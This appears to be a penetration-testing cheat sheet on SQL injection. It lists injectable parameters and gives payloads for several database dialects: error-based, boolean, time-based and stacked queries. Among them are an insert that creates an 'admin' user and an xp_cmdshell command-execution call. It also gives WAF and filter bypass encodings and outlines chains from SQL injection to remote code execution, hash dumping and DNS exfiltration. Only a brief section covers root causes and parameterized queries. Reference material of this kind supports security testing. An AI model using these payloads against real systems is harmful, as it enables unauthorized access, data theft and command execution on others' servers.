# SQL Injection (SQLi)

## Attack Surface Signals
- **Parameters**: `id`, `user`, `search`, `query`, `filter`, `sort`, `order_by`, `limit`, `offset`, `category`, `column`.
- **Headers & Metadata**: `User-Agent`, `X-Forwarded-For`, `Referer`, `Cookie`, JWT custom claims.
- **Input Formats**: JSON object properties, XML body elements, GraphQL string arguments.

## Detection Patterns & Differential Confirmation
1. **Error-Based Detection**:
   - Payloads: `'`, `"`, `\`, `')`, `")`, `'))`, `"))`, `/*`
   - Look for SQL dialect error strings: `ODBC Driver`, `ORA-`, `pg_query()`, `syntax error near`.
2. **Boolean-Based Blind Differentials**:
   - True: `' AND 1=1-- -` or `' AND 'a'='a`
   - False: `' AND 1=2-- -` or `' AND 'a'='b`
   - Observe differences in response length, status codes, or rendered content.
3. **Time-Based Blind Verification**:
   - MySQL: `' AND (SELECT SLEEP(5))-- -` or `1 AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)`
   - PostgreSQL: `'; SELECT pg_sleep(5);--`
   - Microsoft SQL Server: `'; WAITFOR DELAY '0:0:5';--`
   - Oracle: `' AND 1234=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--`
   - SQLite: `' AND (SELECT 1 FROM (SELECT COUNT(*),1 FROM (SELECT 1 UNION SELECT 2) GROUP BY 1) WHERE 1=1 AND RANDOMBLOB(500000000))--`
4. **Stacked Queries**:
   - PostgreSQL: `'; INSERT INTO users (username, role) VALUES ('hacked', 'admin');--`
   - MSSQL: `'; EXEC xp_cmdshell('whoami');--`

## WAF & Filter Bypasses
- **Whitespace Alternatives**: `/**/`, `%09`, `%0a`, `%0b`, `%0c`, `%0d`, `%a0`
- **Keyword Obfuscation**: `uNiOn/**/SeLeCt`, `UNunionION SELselectECT`, `/*!50000SELECT*/`
- **String Encodings**: `0x61646d696e` (hex), `CHAR(97,100,109,105,110)`
- **Parameter Pollution**: `?id=1/*&id=*/UNION/*&id=*/SELECT/*&id=*/1,2,3--`

## Common Root Causes
- Dynamic SQL string concatenation instead of parameterized queries / prepared statements (`PreparedStatement`, ORM bindings).
- Dynamic query ordering / sorting clauses (`ORDER BY :column`) where ORMs fail to parameterize identifiers.

## Exploit Chains
- **SQLi → RCE**: Stacking queries to invoke `xp_cmdshell` (MSSQL), `COPY ... TO PROGRAM` (PostgreSQL), or `INTO OUTFILE` (MySQL).
- **SQLi → Pre-Auth Admin Account Creation / Password Hash Dump**.
- **SQLi → Out-of-Band DNS Exfiltration** (`xp_dirtree`, `UTL_HTTP.REQUEST`).
